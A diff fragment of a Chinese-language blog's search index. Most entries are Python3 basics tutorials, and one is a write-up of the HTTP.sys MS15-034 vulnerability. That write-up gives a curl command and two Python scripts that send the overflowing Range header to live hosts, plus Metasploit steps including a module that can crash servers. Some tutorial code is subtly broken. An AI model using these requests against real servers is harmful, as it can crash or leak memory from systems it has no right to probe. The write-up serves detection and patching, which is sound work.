返回为两个其他集合的交集的集合。</span><br><span class="line">intersection_update()	删除此集合中不存在于其他指定集合中的项目。</span><br><span class="line">isdisjoint()	返回两个集合是否有交集。</span><br><span class="line">issubset()	返回另一个集合是否包含此集合。</span><br><span class="line">issuperset()	返回此集合是否包含另一个集合。</span><br><span class="line">symmetric_difference()	返回具有两组集合的对称差集的集合。</span><br><span class="line">symmetric_difference_update()	插入此集合和另一个集合的对称差集。</span><br><span class="line">union()	返回包含集合并集的集合。</span><br><span class="line">update()	用此集合和其他集合的并集来更新集合。</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-异常</title>
+    <url>//fc7cf6eade53.html</url>
+    <content><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>程序运行过程当中，不可避免的会出现一些错误</p>
+<p>这些错误在过程中，我们称之为异常</p>
+<h2 id="处理异常"><a href="#处理异常" class="headerlink" title="处理异常"></a>处理异常</h2><p>程序运行时出现异常，目的并不是让我们的程序直接终止<br>我们可以在出现异常时，编写代码对异常进行处理<br>避免因为一个异常导致程序的终止</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> 语句</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		代码块（可能出现错误的语句）</span><br><span class="line">	<span class="comment"># 如果except后不跟任何内容，会捕获所有的异常</span></span><br><span class="line">	<span class="comment"># 如果跟着异常的类型，只会捕获相关异常</span></span><br><span class="line">	<span class="comment"># 如果既想捕获所有异常，又想捕获某一异常，可以写多个except语句</span></span><br><span class="line">	<span class="comment"># Exception 是所有异常的父类，如果except后跟的是Exception，他也会捕获到所有的异常</span></span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">except</span> 异常类型 <span class="keyword">as</span> 异常名:</span><br><span class="line">		代码块（出现错误以后的处理方式）</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		代码块（没出现错误时执行的语句）</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		代码块（无论是否有异常，该代码总会执行）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把异常用as的方式赋值给变量</span></span><br><span class="line"><span class="keyword">except</span> 异常 <span class="keyword">as</span> x</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p>如果在函数中对异常进行处理，异常便不会影响程序<br>如果不对函数的异常进行处理，异常会传递到函数的调用处<br>出现异常后，所有异常信息会保存在一个专门保存异常的对象中<br>异常传播时，会调用这个保存异常的对象<br>比如 ：<br>    ZeroDivisionError类的对象专门用来表示除0的异常<br>    NameError类的对象专门用来处理变量错误的异常</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">可以使用 <span class="keyword">raise</span> 语句来抛出异常</span><br><span class="line"><span class="comment"># raise用于向外部抛出异常，后边可以跟一个异常类，或异常类的实例</span></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a &lt; <span class="number">0</span> <span class="keyword">or</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">&#x27;两个参数中不能有负数&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 也可以自定义异常类，只需要创建一个类继承Exception即可</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h2><p>一般用于对程序某个时刻必须满足的条件进行验证</p>
+<p>因为<code>assert</code>条件为<code>False</code>才会执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a,b</span>):</span></span><br><span class="line">	<span class="keyword">assert</span> a &lt; <span class="number">0</span> <span class="keyword">and</span> b &lt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line">	<span class="keyword">return</span> a+b</span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">123</span>,<span class="number">456</span>))</span><br><span class="line"><span class="comment"># 这里or是找True，所以不合适，应该使用and，找False</span></span><br><span class="line"><span class="comment"># a &lt; 0为True,所以不抛出异常,b&lt;0为False，所以抛出异常</span></span><br><span class="line">可以写成</span><br><span class="line"><span class="keyword">assert</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span>,<span class="string">&quot;两个参数中不能有负数&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用try语句控制</span></span><br><span class="line">a = -<span class="number">123</span></span><br><span class="line">b = <span class="number">456</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    add(a,b)</span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入有误：&quot;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(add(a,b))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内置异常"><a href="#内置异常" class="headerlink" title="内置异常"></a>内置异常</h2><ul>
+<li>Exception：所有异常的父类<ul>
+<li>SystemExit：解释器请求退出</li>
+<li>KeyboardInterrupt：用户中断执行</li>
+<li>GeneratorExit：生成器发生异常来通知退出</li>
+<li>Exception：常规错误的父类<ul>
+<li>StopIteration：迭代器没有更多的值</li>
+<li>StopAsyncIteration：必须通过异步迭代器对象的__anext__()方法引发以停止迭代</li>
+<li>ArithmeticError：所有数值计算错误的基类<ul>
+<li>FloatingPointError：浮点数计算错误</li>
+<li>OverflowError：数值运算超出最大限制</li>
+<li>ZeroDivisionError：除(或取模)零所有数据类型</li>
+</ul>
+</li>
+<li>AssertionError：当<code>assert</code>语句判定<code>False</code>，断言失败</li>
+<li>AttributeError：对象中没有这个属性</li>
+<li>BufferError：与缓冲区相关的操作引发</li>
+<li>EOFError：没有内建输入，到达EOF标记</li>
+<li>ImportError：导入模块失败<ul>
+<li>ModuleNotFoundError：找不到模块</li>
+</ul>
+</li>
+<li>LookupError：无效数据查询<ul>
+<li>IndexError：序列中没有此索引</li>
+<li>KeyError：映射中没有这个键</li>
+</ul>
+</li>
+<li>MemoryError：内存溢出错误</li>
+<li>NameError：未声明，初始化对象<ul>
+<li>UnboundLocalError：访问未初始化的本地变量</li>
+</ul>
+</li>
+<li>OSError：操作系统错误<ul>
+<li>BlockingIOError：操作将阻塞对象设置为非阻塞操作</li>
+<li>ChildProcessError：子进程上的操作失败</li>
+<li>ConnectionError：与链接相关的异常<ul>
+<li>BrokenPipeError：在关闭写入的套接字上写入</li>
+<li>ConnectionAbortedError：链接被对方终止</li>
+<li>ConnectionRefusedError：链接被对方拒绝</li>
+<li>ConnectionResetError：链接被对方重置</li>
+</ul>
+</li>
+<li>FileExistsError：创建已存在的文件或者目录</li>
+<li>FileNotFoundError：请求文件或者目录不存在</li>
+<li>InterruptedError：系统调用被输入信号中断</li>
+<li>IsADirectoryError：在目录上请求文件</li>
+<li>NotADirectoryError：在不是目录事物上请求目录操作</li>
+<li>PermissionError：没有访问权限</li>
+<li>ProcessLookupError：进程不存在</li>
+<li>TimeoutError：系统函数在系统级别超时</li>
+</ul>
+</li>
+<li>ReferenceError：弱引用试图访问已经垃圾回收了的对象</li>
+<li>RuntimeError：一般的运行时错误<ul>
+<li>NotImplementedError：尚未实现的方法</li>
+<li>RecursionError：解释器检测到超出最大递归深度</li>
+</ul>
+</li>
+<li>SyntaxError：Python语法错误<ul>
+<li>IndentationError：缩进错误<ul>
+<li>TabError：Tab和空格混用</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SystemError：系统错误</li>
+<li>TypeError：类型错误</li>
+<li>ValueError：传入无效的参数<ul>
+<li>UnicodeError：Unicode 相关的错误<ul>
+<li>UnicodeDecodeError：Unicode 解码时的错误</li>
+<li>UnicodeEncodeError：Unicode 编码时错误</li>
+<li>UnicodeTranslateError：Unicode 转换时错误</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Warning：警告的错误<ul>
+<li>DeprecationWarning：关于被弃用的特征的警告</li>
+<li>PendingDeprecationWarning：关于构造将来语义会有改变的警告</li>
+<li>RuntimeWarning：可疑的运行行为的警告</li>
+<li>SyntaxWarning：可疑的语法的警告</li>
+<li>UserWarning：用户代码生成的警告</li>
+<li>FutureWarning：有关已弃用功能的警告的基类</li>
+<li>ImportWarning：模块导入时可能出错的警告的基类</li>
+<li>UnicodeWarning：与Unicode相关的警告的基类</li>
+<li>BytesWarning：bytes和bytearray相关的警告的基类</li>
+<li>ResourceWarning：与资源使用相关的警告的基类</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 ]]></content>
       <categories>
         <category>Python3</category>
@@ -1245,6 +1309,30 @@
 
 
 <h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">path = os.listdir()</span><br><span class="line"><span class="comment"># os.listdir()获取指定目录的结构，默认获取当前路径，返回一个列表</span></span><br><span class="line">path1 = os.getcwd()</span><br><span class="line"><span class="comment"># os.getcwd()获取当前所在的路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;c:\\xxx\\xxx&quot;</span>)</span><br><span class="line"><span class="comment"># os.chdir(&quot;c:\\&quot;&quot;)修改当前路径为xxx</span></span><br><span class="line">pprint.pprint(path1)</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下创建一个目录</span></span><br><span class="line">os.rmdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除一个目录</span></span><br><span class="line">os.remove(<span class="string">&quot;xxx.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除文件</span></span><br><span class="line">os.rename(<span class="string">&quot;旧名字&quot;</span>,<span class="string">&quot;新名字&quot;</span>)</span><br><span class="line"><span class="comment"># 对文件重命名</span></span><br><span class="line">os.rename(<span class="string">&quot;文件名&quot;</span>,<span class="string">&quot;路径/文件名&quot;</span>)</span><br><span class="line"><span class="comment"># 也可以用来移动文件</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-流程控制语句</title>
+    <url>//f68e861f37cd.html</url>
+    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
+
+<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1407,30 +1495,6 @@
 </tr>
 </tbody></table>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">匹配url</span><br><span class="line"><span class="comment"># 正则的语法里面不能敲空格</span></span><br><span class="line">re.findall(<span class="string">&#x27;[a-zA-Z]&#123;4,5&#125;://\w*\.*\w+\.\w+&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;(https://|http://)(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line">re.findall(<span class="string">&#x27;https://(\w*\.*\w+\.\w+)&#x27;</span>,url)</span><br><span class="line"></span><br><span class="line">匹配邮箱</span><br><span class="line">re.findall(<span class="string">&#x27;.+@\w*\.*\w+&#x27;</span>,mail)</span><br><span class="line">re.findall(<span class="string">&#x27;.+@.+&#x27;</span>,mail)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-流程控制语句</title>
-    <url>//f68e861f37cd.html</url>
-    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
-
-<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -2167,6 +2231,44 @@
       </tags>
   </entry>
   <entry>
+    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
+    <url>//67bda6fdaf83.html</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
+<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
+<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器打上了补丁，那么响应状态应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
+<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
